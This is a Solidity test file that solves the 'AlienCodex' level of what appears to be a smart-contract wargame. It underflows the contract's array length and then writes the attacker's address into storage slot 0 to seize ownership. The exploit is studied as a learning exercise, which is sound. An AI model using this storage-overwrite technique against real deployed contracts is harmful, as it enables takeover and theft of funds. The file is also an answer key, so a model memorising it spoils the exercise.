// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {AlienCodexFactory} from "../src/levels/19-AlienCodexFactory.sol";
import {IAlienCodex} from "../src/levels/19-IAlienCodex.sol";

contract AlienCodexSolution is BaseTest {

    function solution(address payable target_) internal override{
        IAlienCodex target = IAlienCodex(target_);
        // this'll break the 'contacted' slot, I do not care.
        bytes32 storageContent = bytes32(bytes20(attacker)) >> 12*8;
        uint256 indexForStorageStart  = type(uint256).max - uint256(
            keccak256(abi.encodePacked(bytes32(uint256(1))))
          ) + 1;
        target.make_contact();
        target.retract();
        target.revise(
          indexForStorageStart ,
          storageContent
        );
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new AlienCodexFactory()));
    }
}
